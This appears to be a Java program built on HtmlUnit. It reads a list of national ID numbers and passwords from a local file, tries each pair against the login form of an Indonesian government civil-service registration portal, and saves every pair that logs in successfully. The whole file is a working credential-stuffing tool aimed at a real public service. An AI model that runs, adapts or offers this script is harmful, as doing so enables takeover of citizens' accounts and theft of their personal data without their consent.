package com.fjr.sscn;

import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.PrintWriter;

import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlButton;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlInput;
import com.gargoylesoftware.htmlunit.html.HtmlPage;

public class CheckLogin2019 {
	
	PrintWriter out  = null; 
	BufferedReader reader = null; 
	
	
	public CheckLogin2019() throws Exception{
		
		HtmlPage page1 = null;
		WebClient webClient = new WebClient();
		webClient.getCookieManager().clearCookies();
		webClient.getOptions().setJavaScriptEnabled(false);
		webClient.getOptions().setCssEnabled(false);
		
		reader = new BufferedReader(new FileReader("E:/login password/daftar_login - 5.txt"));  
		out = new PrintWriter(new FileOutputStream("E:/login password/sukses - 5.txt")); 
		
	
		
		String masuk ; 
		try {
			while((masuk = reader.readLine()) != null) {
				page1 = webClient.getPage("https://sscndaftar.bkn.go.id/login");
				String[] aa = masuk.split("\\|"); 
				
				String nik = aa[0]; 
				String password = aa[1]; 
				
				HtmlForm form = (HtmlForm) page1.getElementById("FormLogin"); 
				HtmlInput name = form.getInputByName("username"); 

				name.setValueAttribute(nik); 
				HtmlInput passwordForm = form.getInputByName("password"); 
				passwordForm.setValueAttribute(password); 
				HtmlButton button = (HtmlButton) page1.getElementById("btnSimpan"); 
				HtmlPage page2 = button.click();
				String result = page2.asText(); 
				if( ! result.toLowerCase().contains("nik tidak ditemukan") && 
						! result.toLowerCase().contains("bad credential") &&  ! result.toLowerCase().contains("resume pendaftaran")) {
					out.println(nik + "|" + password);  
					out.flush();
				}
			}

		}catch(Exception e) {
			e.printStackTrace();
		}finally {
			if( out != null) {
				out.close();
			}
			if( reader!= null) {
				reader.close();
			}
		}
		System.out.println("FINISH"); 
	}
	
	
	public static void main(String [] args) {
		
		try {
			new CheckLogin2019();
		}catch(Exception e) {
			e.printStackTrace();
		}
		
	}
	
	

}
